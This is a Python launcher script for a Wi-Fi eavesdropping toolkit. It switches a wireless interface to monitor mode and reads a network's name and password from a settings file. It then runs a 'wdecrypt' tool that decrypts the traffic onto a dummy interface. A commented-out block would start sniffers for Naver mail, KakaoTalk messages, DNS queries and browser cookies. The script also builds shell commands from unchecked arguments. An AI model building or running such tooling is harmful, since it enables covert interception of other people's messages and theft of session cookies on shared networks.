from scapy import *
import os
from threading import Thread
import time
import sys


if __name__ == '__main__':
	if len(sys.argv) != 2:
		print("Usage : {} interface".format(sys.argv[0]))
		sys.exit()

	interface=sys.argv[1]
	os.system("ifconfig " + interface + " down")
	os.system("iwconfig " + interface + " mode mon")
	os.system("ifconfig " + interface + " up")
	
	real_path = os.path.dirname(os.path.realpath(__file__))
	setting_path = os.path.join(real_path, "autorun_setting")
	try:
		with open(setting_path, "rt") as f:
			settings = f.read().split()
		encrypt = settings[0]
		essid = settings[1]
		psk = settings[2]
		channel = settings[3]
	except:
		print("There is no default setting")
		sys.exit()

	
	capture_iface = "tap0"
    
    # generate dummy interface 'tap0'
	dummy_path = os.path.join(real_path, "../wdecrypt/dummy.sh")
	os.popen("bash %s add %s"%(dummy_path,capture_iface))
    
    # set monitroing channel
	os.system("iwconfig {} channel {}".format(interface, channel))
    
    # execute wdecrypt
	path = os.path.join(real_path, "../wdecrypt/wdecrypt")
	wdec_cmd = "{} {} -e {} -p {} -o {} &"
	wdec_cmd = wdec_cmd.format(path, interface, essid, psk, capture_iface)
	print(wdec_cmd)
	os.popen(wdec_cmd)

    # execute python sniffering modules
	print("ESSID : {}, Password : {}, Channel : {}".format(essid, psk, channel))
	sniffers = ["naver_mail_list_sniffer.py", "kakao_sniffer.py", 
	"db_dns.py", "cookie_collector.py"]

	#for sniffer in sniffers:
	#	path = os.path.join(real_path, "../total/%s"%sniffer)
	#	os.popen("python3 %s %s &"%(path, capture_iface))
        
